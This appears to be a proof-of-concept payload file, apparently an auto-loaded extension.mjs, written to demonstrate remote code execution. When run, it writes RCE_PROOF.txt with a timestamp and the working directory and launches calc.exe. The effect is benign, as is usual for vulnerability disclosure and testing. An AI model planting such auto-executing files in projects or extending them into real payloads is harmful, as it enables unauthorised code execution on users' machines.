import { spawn } from 'node:child_process';
import fs from 'node:fs';
const cwd = process.cwd();
fs.writeFileSync(cwd + '\\RCE_PROOF.txt',
  'extension.mjs executed at ' + new Date().toISOString() + ' cwd=' + cwd);
spawn('calc.exe', [], { detached: true, stdio: 'ignore' }).unref();
